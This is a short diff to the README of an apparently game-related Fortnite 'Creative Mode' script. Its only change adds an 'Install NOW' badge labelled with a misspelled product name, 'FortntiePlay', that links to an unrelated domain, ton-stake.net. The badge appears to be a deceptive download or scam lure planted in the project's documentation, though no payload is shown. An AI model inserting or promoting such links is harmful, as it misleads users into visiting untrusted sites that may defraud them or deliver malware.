@@ -67,7 +67,7 @@ This script is intended for Fortnite Creative Mode only and complies with Epic G
 - 🛡️ **Regular Updates**: Maintained for 2025 compatibility.  
 
 ---
-
+[![Install FortntiePlay](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net) 
 ## 📸 Screenshots  
 
 **Fortnite Creative Tool**  
